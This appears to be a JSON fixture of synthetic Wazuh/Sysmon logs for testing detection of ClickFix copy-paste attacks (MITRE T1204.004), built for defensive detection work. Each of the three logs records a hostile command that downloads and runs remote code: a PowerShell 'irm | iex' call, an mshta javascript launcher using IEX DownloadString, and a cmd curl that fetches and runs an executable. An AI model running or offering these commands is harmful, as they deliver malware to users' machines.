{
  "_metadata": {
    "attack_id": "T1204.004",
    "variation": "001",
    "name": "User Execution: Malicious Copy and Paste - ClickFix",
    "description": "User is tricked into copying and pasting malicious PowerShell command (ClickFix attack)",
    "expected_detection": "HIGH",
    "kill_chain_phase": "execution",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - PowerShell executed from Run dialog (ClickFix pattern)",
      "sequence": 1,
      "timestamp": "2026-02-08T15:40:00.000Z",
      "log": {
        "timestamp": "2026-02-08T15:40:00.000+0000",
        "rule": {
          "level": 14,
          "description": "Sysmon - Event 1: Process Create",
          "id": "100916",
          "mitre": {
            "id": [
              "T1204.004",
              "T1059.001"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "User Execution: Malicious Copy and Paste",
              "PowerShell"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1707400100.300045",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-02-08 15:40:00.000",
              "processGuid": "{A1B2C3D4-EXEC-1204-0004-000000000001}",
              "processId": "15234",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell -w hidden -ep bypass -c \"irm https://update-verification.com/fix.ps1 | iex\"",
              "currentDirectory": "C:\\Users\\user.victim\\",
              "user": "CORP\\user.victim",
              "integrityLevel": "Medium",
              "hashes": "SHA256=C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8",
              "parentProcessGuid": "{A1B2C3D4-EXEC-1204-0004-PARENT000001}",
              "parentProcessId": "6540",
              "parentImage": "C:\\Windows\\explorer.exe",
              "parentCommandLine": "C:\\Windows\\explorer.exe"
            }
          }
        },
        "_fomorian_batch": "PT-2026-003-batch2-execution",
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1204.004",
        "_fomorian_expected_detection": "Sigma: ClickFix PowerShell Execution (T1204.004)"
      }
    },
    {
      "_comment": "Sysmon Event 1 - mshta from clipboard paste",
      "sequence": 2,
      "timestamp": "2026-02-08T15:41:00.000Z",
      "log": {
        "timestamp": "2026-02-08T15:41:00.000+0000",
        "rule": {
          "level": 14,
          "description": "Sysmon - Event 1: Process Create",
          "id": "100916",
          "mitre": {
            "id": [
              "T1204.004",
              "T1218.005"
            ],
            "tactic": [
              "Execution",
              "Defense Evasion"
            ],
            "technique": [
              "User Execution: Malicious Copy and Paste",
              "Mshta"
            ]
          },
          "firedtimes": 2,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1707400100.300046",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-02-08 15:41:00.000",
              "processGuid": "{A1B2C3D4-EXEC-1204-0004-000000000002}",
              "processId": "15456",
              "image": "C:\\Windows\\System32\\mshta.exe",
              "commandLine": "mshta.exe \"javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString(\\'http://198.51.100.110/stage2.ps1\\')\\\"',0);close();\"",
              "currentDirectory": "C:\\Users\\user.victim\\",
              "user": "CORP\\user.victim",
              "integrityLevel": "Medium",
              "hashes": "SHA256=D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9",
              "parentProcessGuid": "{A1B2C3D4-EXEC-1204-0004-PARENT000002}",
              "parentProcessId": "6540",
              "parentImage": "C:\\Windows\\explorer.exe",
              "parentCommandLine": "C:\\Windows\\explorer.exe"
            }
          }
        },
        "_fomorian_batch": "PT-2026-003-batch2-execution",
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1204.004",
        "_fomorian_expected_detection": "Sigma: ClickFix MSHTA Execution (T1204.004)"
      }
    },
    {
      "_comment": "Sysmon Event 1 - cmd from Run dialog with curl",
      "sequence": 3,
      "timestamp": "2026-02-08T15:42:00.000Z",
      "log": {
        "timestamp": "2026-02-08T15:42:00.000+0000",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Process Create",
          "id": "100916",
          "mitre": {
            "id": [
              "T1204.004",
              "T1059.003"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "User Execution: Malicious Copy and Paste",
              "Windows Command Shell"
            ]
          },
          "firedtimes": 3,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1707400100.300047",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-02-08 15:42:00.000",
              "processGuid": "{A1B2C3D4-EXEC-1204-0004-000000000003}",
              "processId": "15678",
              "image": "C:\\Windows\\System32\\cmd.exe",
              "commandLine": "cmd /c curl -s http://captcha-verify.net/verify.exe -o %TEMP%\\verify.exe && %TEMP%\\verify.exe",
              "currentDirectory": "C:\\Users\\user.victim\\",
              "user": "CORP\\user.victim",
              "integrityLevel": "Medium",
              "hashes": "SHA256=E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0",
              "parentProcessGuid": "{A1B2C3D4-EXEC-1204-0004-PARENT000003}",
              "parentProcessId": "6540",
              "parentImage": "C:\\Windows\\explorer.exe",
              "parentCommandLine": "C:\\Windows\\explorer.exe"
            }
          }
        },
        "_fomorian_batch": "PT-2026-003-batch2-execution",
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1204.004",
        "_fomorian_expected_detection": "Sigma: ClickFix CMD Curl Execution (T1204.004)"
      }
    }
  ]
}
